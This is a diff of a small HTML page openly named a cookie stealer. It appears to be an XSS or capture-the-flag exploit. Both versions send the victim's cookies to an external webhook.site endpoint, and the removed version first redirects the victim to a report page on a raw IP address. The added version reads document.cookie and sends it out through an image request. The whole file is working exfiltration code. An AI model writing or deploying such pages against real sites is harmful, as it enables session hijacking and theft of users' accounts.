@@ -1,29 +1,19 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Cookie Stealer</title>
-    <!-- Redirect to report.html first (where the cookie exists) -->
-    <meta http-equiv="refresh" content="0;url=http://167.71.200.118:7002/report">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Steal All Cookies</title>
     <script>
-        // After redirecting, embed an image that forces the browser to send the cookie
-        setTimeout(() => {
-            // Method 1: Use fetch() (if not blocked)
-            fetch('https://webhook.site/be8207e9-fda6-4721-87a4-b2f41d965ac2', {
-                method: 'POST',
-                credentials: 'include', // Forces cookies to be sent
-                body: JSON.stringify({ stolen: true }),
-                headers: { 'Content-Type': 'application/json' }
-            });
-
-            // Method 2: Fallback to <img> tag if fetch is blocked
-            const img = new Image();
-            img.src = `https://webhook.site/be8207e9-fda6-4721-87a4-b2f41d965ac2/?stolen=${Date.now()}`;
-            // The cookie will be sent automatically in the request headers
-        }, 1000);
+        // Retrieve all cookies
+        var cookies = document.cookie;
+        
+        // Send all cookies to your webhook server
+        var img = new Image();
+        img.src = `https://webhook.site/be8207e9-fda6-4721-87a4-b2f41d965ac2/steal?cookies=${encodeURIComponent(cookies)}`;
     </script>
 </head>
 <body>
-    <h1>Loading...</h1>
+    <h1>Stealing All Cookies...</h1>
 </body>
 </html>
